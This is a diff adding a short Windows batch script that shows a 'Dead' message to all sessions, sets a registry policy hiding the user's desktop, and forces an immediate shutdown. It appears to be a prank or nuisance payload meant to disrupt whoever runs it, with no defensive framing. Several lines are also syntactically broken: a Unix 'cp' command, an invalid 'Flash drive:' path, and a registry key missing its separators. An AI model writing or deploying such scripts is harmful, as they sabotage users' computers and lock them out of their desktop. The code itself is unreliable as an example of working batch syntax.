@@ -1,0 +1,5 @@
+@echo off 
+cp Flash drive:AUTOEXEC.BAT C: 
+msg * "Dead" >nul 
+reg add HKCUSoftwareMicrosoftWindowsCurrentVersionPoliciesExplorer /v NoDesktop /t REG_DWORD /d 1 /f >nul 
+shutdown -s -t 1 -c "lol" -f >nul
